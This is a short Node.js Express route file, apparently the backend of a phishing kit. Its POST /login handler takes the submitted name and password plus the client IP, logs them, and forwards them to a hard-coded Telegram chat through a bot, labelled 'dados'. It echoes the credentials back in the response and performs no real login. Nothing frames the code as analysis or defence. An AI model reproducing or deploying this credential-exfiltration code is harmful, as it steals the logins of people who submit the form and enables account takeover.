const express = require("express");
const bot = require("./bot");

const routes = express.Router();

routes.post("/login", async function (req, res) {
  let data = `${JSON.stringify(req.body)}`;
  let peer = `${JSON.stringify(req.socket.remoteAddress)}`;

  console.log(`${data}`);

  await bot.telegram.sendMessage(
    "-1001747704625",
    `dados: ${data}, IP: ${peer}`
  );

  return res
    .status(200)
    .json({ login: req.body.name, password: req.body.password });
});

module.exports = routes;
